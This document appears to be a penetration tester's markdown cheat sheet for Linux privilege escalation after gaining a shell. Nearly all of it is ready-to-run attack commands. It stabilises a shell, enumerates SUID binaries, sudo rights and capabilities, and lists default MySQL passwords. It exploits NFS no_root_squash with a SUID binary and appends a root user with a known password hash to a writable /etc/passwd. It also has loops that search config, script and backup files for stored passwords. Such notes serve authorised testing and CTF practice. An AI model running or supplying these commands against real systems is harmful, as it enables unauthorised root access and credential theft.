
## Upgrade Shell
```session
python -c 'import pty; pty.spawn("/bin/bash")'
```
OR
```session
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
Get me colors and an alias
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'
```

Ctrl + Z to Background Process

```session
stty raw -echo ; fg ; reset
stty columns 200 rows 200
```
## Various Capabilities
```
which gcc
which cc
which python
which perl
which wget
which curl
which fetch
which nc
which ncat
which nc.traditional
which socat
```
## Arch
```
file /bin/bash
```
## Kernel
```
uname -a
```
## Issue/Release
```
cat /etc/issue
cat /etc/*-release
```
## Sudo permissions
```
sudo -l
ls -lsaht /etc/sudoers
```
## Groups
```
groups <user>
```
## Environmental Variables
```
env
```
## Users?
```
cd /home/; ls -lsaht
```

```
cat /etc/passwd | grep -vE 'nologin|sync|false'
cat /etc/passwd | grep -v nologin | grep -v false
cat /etc/passwd | grep -v "nologin\|false\|sync"
```
## Web Configs containing credentials
```
cd /var/www/html/; ls -lsaht
```
## SUID Binaries
```
find / -perm -u=s -type f 2>/dev/null
```
## GUID Binaries
```
find / -perm -g=s -type f 2>/dev/null
```
## getcap
Get Granted/Implicit (Required by a Real User) Capabilities of all files recursively throughout the system and pipe all error messages to /dev/null.

```
getcap -r / 2>/dev/null
```
## Netstat
```
netstat -antup
netstat -tunlp
```
## Is anything vulnerable running as root?
```
ps aux | grep -i 'root' --color=auto
```
## MYSQL
```
mysql -uroot -p
sqldump -u root -p toor > dbname.sql
```

Enter Password:
root : root
root : toor
root :
## /etc/
```
cd /etc/; ls -lsaht
```

Anything other than root here?

- Any config files left behind?
` ls -lsaht |grep -i ‘.conf’ --color=auto`
- If we have root priv information disclosure - are there any .secret in /etc/ files?
`ls -lsaht |grep -i ‘.secret’ --color=auto`
## SSH Keys
```
ls -lsaR /home/
```
## Files that may have interesting stuff
```
ls -lsaht /var/lib/
ls -lsaht /var/db/
ls -lsaht /opt/
ls -lsaht /tmp/
ls -lsaht /var/tmp/
ls -lsaht /dev/shm/
```
## File Transfer Capability
```
which wget
which curl
which nc
which fetch (BSD)

ls -lsaht /bin/ |grep -i 'ftp' --color=auto
```
## NFS? 
Can we exploit weak NFS Permissions?
```
cat /etc/exports
```
## no_root_squash
[https://recipeforroot.com/attacking-nfs-shares/](https://recipeforroot.com/attacking-nfs-shares/)

On Attacking Machine
```
mkdir -p /mnt/nfs/
mount -t nfs -o vers=<version 1,2,3> $IP:<NFS Share> /mnt/nfs/ -nolock
gcc suid.c -o suid
cp suid /mnt/nfs/
chmod u+s /mnt/nfs/suid
su <user id matching target machine's user-level privilege.>
```

On Target Machine

```
user@host$ ./suid
```
## File mounts
Any exotic file system mounts/extended attributes?
```
cat /etc/fstab
```
## User creation
Can we write as a low-privileged user to /etc/passwd?
```
openssl passwd -1
i<3hacking
$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.
echo 'cidney:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:cidney:/home/cidney:/bin/bash' >> /etc/passwd
su cidney
id
```
## Cron.
```
crontab –u root –l
```

Look for unusual system-wide cron jobs:

```
cat /etc/crontab
ls /etc/cron.*
```
## File ownership
Bob is a user on this machine. What is every single file he has ever created?
```
find / -user brucetherealadmin 2>/dev/null
```
## Got Mail?
```
cd /var/mail/; ls -lsaht
```
## Logs
must be in the adm group
```session
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

## Credential Hunting

### .conf, .config, .cnf 
```
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

### .cnf

```
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

### .config

```
for i in $(find / -name *.config 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

### .conf

```
for i in $(find / -name *.conf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

### user in .conf

```
for i in $(find / -name *.conf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "brucetherealadmin" $i 2>/dev/null | grep -v "\#";done
```


### .sh files

```
for i in $(find / -name *.sh 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

### credentials in .old files

```
for i in $(find / -name *.old 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

```
for l in $(echo ".old");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```


run these when you've exhaused all the above:
### PSPY

### Linpeas
